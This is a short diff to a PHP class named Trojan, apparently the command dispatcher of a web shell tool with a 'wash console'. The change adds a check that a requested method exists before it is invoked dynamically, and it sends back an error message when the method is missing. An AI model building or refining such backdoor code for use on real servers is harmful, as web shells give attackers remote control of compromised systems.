@@ -45,8 +45,22 @@ class Trojan{
         # otherwise, simply invoke the method directly
         else {
             # metaprogramming FTW
-            $func = $json['action'];
-            $this->$func($json['args']);
+            $method = $json['action'];
+
+            # verify that the method exists before attempting to invoke it
+            if(method_exists($this, $method)){
+                $this->$method($json['args']);
+            }
+            # if the method doesn't exist, send back an error message
+            else {
+                $this->response = array(
+                    # todo: implement error support within the wash console
+                    'error'          => "wash error: the method $method is not supported by the trojan.",
+                    'output'         => "wash error: the method $method is not supported by the trojan.",
+                    'prompt_context' => $this->prompt_context,
+                );
+                $this->send_response();
+            }
         }
     }
 
